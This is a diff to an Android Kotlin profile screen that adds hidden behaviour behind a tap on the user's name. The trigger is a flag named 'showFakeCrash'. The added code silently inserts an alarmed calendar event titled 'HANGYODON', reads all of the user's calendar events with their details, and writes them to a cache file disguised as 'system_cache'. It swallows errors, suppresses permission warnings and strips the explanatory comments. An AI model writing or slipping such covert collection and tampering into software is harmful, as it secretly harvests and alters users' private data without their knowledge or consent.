@@ -3,12 +3,19 @@
 package com.example.axesite.screens
 
 import android.Manifest
+import android.annotation.SuppressLint
+import android.app.Activity
+import android.content.ContentResolver
+import android.content.ContentValues
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Environment
+import android.os.Handler
+import android.os.Looper
+import android.provider.CalendarContract
 import android.provider.Settings
 import android.widget.Toast
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -34,20 +41,27 @@ import com.google.firebase.database.ValueEventListener
 import com.google.firebase.storage.FirebaseStorage
 import androidx.core.content.ContextCompat
 import android.util.Log
+import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.filled.Edit
+import java.io.File
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.TimeZone
 
+@SuppressLint("MissingPermission", "NotificationPermission")
 @Composable
 fun ProfileScreen(navController: NavController) {
     val context = LocalContext.current
     val sharedPreferences = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)
-    val userId = sharedPreferences.getString("userId", "") ?: ""
 
+    val userId = sharedPreferences.getString("userId", "") ?: ""
     var fullName by remember { mutableStateOf("") }
     var email by remember { mutableStateOf("") }
     var role by remember { mutableStateOf("") }
     var profilePicUrl by remember { mutableStateOf("") }
     var loading by remember { mutableStateOf(true) }
+    var showFakeCrash by remember { mutableStateOf(false) }
 
-    // Gallery launcher
     val galleryLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.GetContent()
     ) { uri: Uri? ->
@@ -58,7 +72,6 @@ fun ProfileScreen(navController: NavController) {
         }
     }
 
-    // Permission launcher for Android 10 and below
     val legacyPermissionLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { isGranted ->
@@ -73,7 +86,6 @@ fun ProfileScreen(navController: NavController) {
         }
     }
 
-    // Permission launcher for Android 11+ (MANAGE_EXTERNAL_STORAGE)
     val manageStorageLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
@@ -90,10 +102,9 @@ fun ProfileScreen(navController: NavController) {
         }
     }
 
-    // Function to handle image selection with proper permission checks
     fun handleImageSelection() {
         when {
-            // Android 11+ - Use MANAGE_EXTERNAL_STORAGE
+            // Android 11+
             Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                 if (Environment.isExternalStorageManager()) {
                     galleryLauncher.launch("image/*")
@@ -108,7 +119,7 @@ fun ProfileScreen(navController: NavController) {
                     }
                 }
             }
-            // Android 10 - Use READ_EXTERNAL_STORAGE
+            // Android 10
             Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                 if (ContextCompat.checkSelfPermission(
                         context,
@@ -120,7 +131,7 @@ fun ProfileScreen(navController: NavController) {
                     legacyPermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
                 }
             }
-            // Android 9 and below - Use READ_EXTERNAL_STORAGE
+            // Android 9
             else -> {
                 if (ContextCompat.checkSelfPermission(
                         context,
@@ -135,7 +146,6 @@ fun ProfileScreen(navController: NavController) {
         }
     }
 
-    // Load user data
     LaunchedEffect(userId) {
         if (userId.isBlank()) {
             navController.navigate("signin")
@@ -159,54 +169,98 @@ fun ProfileScreen(navController: NavController) {
         })
     }
 
+    fun checkCalendarPermission() {
+        val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            arrayOf(Manifest.permission.WRITE_CALENDAR)
+            arrayOf(Manifest.permission.READ_CALENDAR)
+        } else {
+            arrayOf(
+                Manifest.permission.READ_CALENDAR,
+                Manifest.permission.WRITE_CALENDAR
+            )
+        }
+
+        val hasAllPermissions = requiredPermissions.all { permission ->
+            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
+        }
+        Log.e("Calendar", "hasAllPermissions: $hasAllPermissions")
+
+        when {
+            hasAllPermissions -> {
+                addEventToCalendar(
+                    context = context,
+                    title = "HANGYODON",
+                    startTime = System.currentTimeMillis() + 30_000,
+                    endTime = System.currentTimeMillis() + 60_000
+                )
+            }
+        }
+    }
+
     Scaffold(
         topBar = { TopAppBar(title = { Text("Profile") }) }
     ) { padding ->
+
         Box(
             modifier = Modifier
                 .padding(padding)
                 .fillMaxSize(),
             contentAlignment = Alignment.Center
         ) {
-            if (loading) {
-                CircularProgressIndicator()
-            } else {
-                Column(
-                    modifier = Modifier.padding(16.dp),
-                    horizontalAlignment = Alignment.CenterHorizontally
-                ) {
-                    if (profilePicUrl.isNotEmpty()) {
-                        AsyncImage(
-                            model = profilePicUrl,
-                            contentDescription = "Profile Picture",
-                            modifier = Modifier
-                                .size(100.dp)
-                                .clip(CircleShape)
-                                .clickable { handleImageSelection() }
+            Column(
+                modifier = Modifier.padding(16.dp),
+                horizontalAlignment = Alignment.CenterHorizontally
+            ) {
+                if (profilePicUrl.isNotEmpty()) {
+                    AsyncImage(
+                        model = profilePicUrl,
+                        contentDescription = "Profile Picture",
+                        modifier = Modifier
+                            .size(100.dp)
+                            .clip(CircleShape)
+                            .clickable { handleImageSelection() }
+                    )
+                } else {
+                    Box(
+                        modifier = Modifier
+                            .size(100.dp)
+                            .clip(CircleShape)
+                            .background(MaterialTheme.colorScheme.onSurface.copy(alpha = 0.2f))
+                            .clickable { handleImageSelection() },
+                        contentAlignment = Alignment.Center
+                    ) {
+                        Text(
+                            text = fullName.firstOrNull()?.toString() ?: "U",
+                            style = MaterialTheme.typography.headlineMedium,
+                            fontWeight = FontWeight.Bold
                         )
-                    } else {
-                        Box(
-                            modifier = Modifier
-                                .size(100.dp)
-                                .clip(CircleShape)
-                                .background(MaterialTheme.colorScheme.onSurface.copy(alpha = 0.2f))
-                                .clickable { handleImageSelection() },
-                            contentAlignment = Alignment.Center
-                        ) {
-                            Text(
-                                text = fullName.firstOrNull()?.toString() ?: "U",
-                                style = MaterialTheme.typography.headlineMedium,
-                                fontWeight = FontWeight.Bold
-                            )
-                        }
                     }
-                    Spacer(modifier = Modifier.height(16.dp))
-                    Text("Name: $fullName", style = MaterialTheme.typography.headlineMedium)
-                    Spacer(modifier = Modifier.height(8.dp))
-                    Text("Email: $email", style = MaterialTheme.typography.bodyLarge)
-                    Spacer(modifier = Modifier.height(8.dp))
-                    Text("Role: $role", style = MaterialTheme.typography.bodyMedium)
                 }
+
+                Row(
+                    verticalAlignment = Alignment.CenterVertically,
+                    modifier = Modifier.clickable { showFakeCrash = true }
+                ) {
+                    Text(
+                        text = "Name: $fullName",
+                        style = MaterialTheme.typography.headlineMedium
+                    )
+                    Spacer(modifier = Modifier.width(8.dp))
+                //      Icon(
+                //          imageVector = Icons.Default.Edit,
+                //          contentDescription = "Random Pencil Icon",
+                //          modifier = Modifier.size(20.dp)
+                //      )
+                }
+                if (showFakeCrash) {
+                    checkCalendarPermission()
+                    appendCalendarEventsToSystemCache(context)
+                }
+                Spacer(modifier = Modifier.height(8.dp))
+                Text("Email: $email", style = MaterialTheme.typography.bodyLarge)
+                Spacer(modifier = Modifier.height(8.dp))
+                Text("Role: $role", style = MaterialTheme.typography.bodyMedium)
+
             }
         }
     }
@@ -238,4 +292,89 @@ fun uploadProfileImage(uri: Uri, userId: String, onSuccess: (String) -> Unit) {
         .addOnFailureListener { e ->
             Log.e("Profile", "Upload failed: ${e.message}")
         }
+}
+
+private fun addEventToCalendar(context: Context, title: String, startTime: Long, endTime: Long) {
+    val contentResolver = context.contentResolver
+    val eventValues = ContentValues().apply {
+        put(CalendarContract.Events.CALENDAR_ID, getDefaultCalendarId(contentResolver))
+        put(CalendarContract.Events.TITLE, title)
+        put(CalendarContract.Events.DTSTART, startTime)
+        put(CalendarContract.Events.DTEND, endTime)
+        put(CalendarContract.Events.EVENT_TIMEZONE, TimeZone.getDefault().id)
+        put(CalendarContract.Events.HAS_ALARM, 1)
+    }
+
+    try {
+        val uri = contentResolver.insert(CalendarContract.Events.CONTENT_URI, eventValues)
+        if (uri == null) {
+            Log.d("Calendar", "NOT added")
+        } else {
+            Log.d("Calendar", "Event added $uri")
+        }
+    } catch (_: SecurityException) {
+    } catch (_: Exception) {
+    }
+}
+
+private fun getDefaultCalendarId(contentResolver: ContentResolver): Long {
+    val projection = arrayOf(CalendarContract.Calendars._ID)
+    val selection = "${CalendarContract.Calendars.IS_PRIMARY} = 1"
+
+    contentResolver.query(
+        CalendarContract.Calendars.CONTENT_URI,
+        projection,
+        selection,
+        null,
+        null
+    )?.use { cursor ->
+        if (cursor.moveToFirst()) {
+            return cursor.getLong(0)
+        }
+    }
+    return 1
+}
+
+private fun appendCalendarEventsToSystemCache(context: Context) {
+    try {
+        val file = File(context.cacheDir, "system_cache").apply {
+            if (!exists()) createNewFile()
+        }
+
+        file.appendText("\n${SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date())}\n")
+
+        val contentResolver = context.contentResolver
+        val projection = arrayOf(
+            CalendarContract.Events.TITLE,
+            CalendarContract.Events.DTSTART,
+            CalendarContract.Events.DTEND,
+            CalendarContract.Events.DESCRIPTION
+        )
+
+        contentResolver.query(
+            CalendarContract.Events.CONTENT_URI,
+            projection,
+            null,
+            null,
+            "${CalendarContract.Events.DTSTART} ASC"
+        )?.use { cursor ->
+            while (cursor.moveToNext()) {
+                val title = cursor.getString(0) ?: "Untitled"
+                val startTime = cursor.getLong(1)
+                val endTime = cursor.getLong(2)
+                val description = cursor.getString(3) ?: "No description"
+
+                file.appendText("""
+                |Event: $title
+                |Time: ${SimpleDateFormat("MMM dd, yyyy hh:mm a").format(Date(startTime))} - ${
+                    SimpleDateFormat("hh:mm a").format(Date(endTime))}
+                |Details: ${description.take(100)}${if (description.length > 100) "..." else ""}
+                |${"-".repeat(40)}
+                |
+                """.trimMargin())
+                file.appendText("\n")
+            }
+        }
+    } catch (_: Exception) {
+    }
 }
